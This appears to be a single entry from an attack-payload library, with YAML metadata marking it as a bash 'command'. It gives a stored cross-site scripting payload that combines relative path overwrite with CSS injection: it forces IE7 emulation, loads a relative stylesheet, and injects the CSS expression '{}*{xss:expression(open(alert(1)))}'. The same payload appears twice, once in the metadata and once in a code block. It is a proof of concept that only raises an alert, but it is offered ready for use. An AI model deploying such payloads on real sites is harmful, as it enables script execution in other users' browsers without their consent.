---
id: 23e8cd7d-9f3d-420b-89cb-b7063428a88d
name: Stored XSS with CSS injection
type: command
executor: bash
data: 'http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]

  <html>

  <head>

  <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />

  <link href="[RELATIVE_URL_INSERTED_HERE]/styles.css" rel="stylesheet" type="text/css"
  />

  </head>

  <body>

  Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}

  </body>

  </html>'
output: null
created_at: '2023-04-06T03:56:43.832749+00:00'
updated_at: '2023-04-06T03:56:43.857040+00:00'
---

# Stored XSS with CSS injection

```bash
http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<link href="[RELATIVE_URL_INSERTED_HERE]/styles.css" rel="stylesheet" type="text/css" />
</head>
<body>
Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}
</body>
</html>
```


